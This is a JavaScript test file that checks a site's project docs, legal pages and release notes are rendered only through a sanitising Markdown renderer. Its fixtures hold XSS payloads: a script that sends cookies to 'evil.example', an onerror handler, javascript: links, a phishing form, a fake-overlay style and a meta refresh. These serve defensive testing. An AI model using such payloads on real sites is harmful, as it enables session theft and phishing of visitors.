// A project's own docs, legal pages and release notes are B.MD written by the project's
// editors, and they reach every visitor of the project page (PLAN-SEPT23 G2 + G3, pentest R10).
// They must go through the same sanitising renderer as the blog and the site docs, and only it.
//
// Two checks, because either alone proves little:
//   · the SOURCE: every body on the project page is drawn by ui/md.jsx's default export (the
//     site's one Markdown, which wraps packages/bmd), and nothing there writes HTML itself;
//   · the OUTPUT: hostile documents of the kind an editor could store, rendered through the real
//     packages/bmd pipeline (esbuild for node, as scripts/check-md-security.mjs does), come out
//     with nothing executable left.
// The API side (apps/api/test/project-content.test.mjs) proves the body is stored as written,
// so what is rendered here is exactly what a visitor would get.
import { test, describe, before, after } from 'node:test';
import assert from 'node:assert/strict';
import { readFileSync, writeFileSync, rmSync } from 'node:fs';
import { dirname, join } from 'node:path';
import { fileURLToPath, pathToFileURL } from 'node:url';

const WEB = join(dirname(fileURLToPath(import.meta.url)), '..');
const read = (p) => readFileSync(join(WEB, p), 'utf8');

describe('project content: rendered only by the sanitising renderer', () => {
  test('the reader draws every body with ui/md.jsx and writes no HTML of its own', () => {
    const src = read('src/pages/project-content.jsx');
    assert.match(src, /^import Markdown(, \{[^}]*\})? from '\.\.\/ui\/md\.jsx';$/m, 'Markdown must be ui/md.jsx');
    // Every stored body: doc and legal pages (picked.entry.body), release notes (entry.notes).
    assert.match(src, /<Markdown>\{picked\.entry\?\.body \|\| ''\}<\/Markdown>/);
    assert.match(src, /<Markdown>\{entry\.notes\}<\/Markdown>/);
    for (const f of ['src/pages/project-content.jsx', 'src/editor/project-content-editors.jsx']) {
      assert.doesNotMatch(read(f), /dangerouslySetInnerHTML|innerHTML\s*=/, `${f} writes HTML`);
    }
    // And ui/md.jsx is the kit's renderer, not a second one.
    assert.match(read('src/ui/md.jsx'), /import Markdown, \{ configureMarkdown \} from '@bettercommunity\/bmd';/);
  });
});

const ON_ATTR = /<[a-z][^>]*\son[a-z]+\s*=/i;
const HOSTILE = [
  { name: 'script in a legal page', md: '# Privacy\n\n<script>fetch("https://evil.example/?c="+document.cookie)</script>\n', forbid: [/<script/i, /evil\.example/] },
  { name: 'img onerror in a doc', md: 'Setup\n\n<img src=x onerror="alert(1)">', forbid: [ON_ATTR] },
  { name: 'javascript: link in release notes', md: '[Download the fix](javascript:alert(1))', forbid: [/javascript:/i] },
  { name: 'javascript: through a button', md: 'x :button[Get it]{href=javascript:alert(1)}', forbid: [/javascript:/i] },
  { name: 'form phishing inside a doc', md: '<form action="https://evil.example"><input name="password"></form>', forbid: [/<form/i, /evil\.example/] },
  { name: 'iframe off the allowlist', md: '<iframe src="https://evil.example/x"></iframe>', forbid: [/evil\.example/] },
  { name: 'fixed overlay through style', md: '<div style="position:fixed;inset:0;z-index:9999">Sign in again</div>', forbid: [/position\s*:\s*fixed/i] },
  { name: 'meta refresh', md: '<meta http-equiv="refresh" content="0;url=https://evil.example">', forbid: [/http-equiv/i, /evil\.example/] },
];

let render = null;
const entry = join(WEB, 'node_modules', '.pc-render-entry.jsx');
const bundle = join(WEB, 'node_modules', '.pc-render-bundle.mjs');
before(async () => {
  const esbuild = await import('esbuild');
  writeFileSync(entry, [
    "import { renderToStaticMarkup } from 'react-dom/server';",
    "import Markdown from '../../../packages/bmd/src/index.jsx';",
    'export const render = (md) => renderToStaticMarkup(<Markdown>{md}</Markdown>);',
  ].join('\n'));
  await esbuild.build({
    nodePaths: [join(WEB, 'node_modules')],
    entryPoints: [entry], outfile: bundle, bundle: true, format: 'esm', platform: 'node',
    jsx: 'automatic', logLevel: 'silent', packages: 'external', loader: { '.css': 'empty' },
    absWorkingDir: WEB,
  });
  ({ render } = await import(pathToFileURL(bundle).href));
});
after(() => { for (const f of [entry, bundle]) { try { rmSync(f, { force: true }); } catch { /* gone */ } } });

describe('project content: hostile bodies through the real renderer', () => {
  for (const c of HOSTILE) {
    test(c.name, () => {
      const html = render(c.md);
      assert.ok(html.length > 0, 'rendered nothing');
      for (const re of c.forbid) assert.doesNotMatch(html, re, `${re} survived: ${html.slice(0, 200)}`);
    });
  }
  test('ordinary content still renders', () => {
    const html = render('## Install\n\n[Download](https://example.com/setup.exe) and read [the terms](/legal/terms).');
    assert.match(html, /href="https:\/\/example\.com\/setup\.exe"/);
    assert.match(html, /href="\/legal\/terms"/);
  });
});
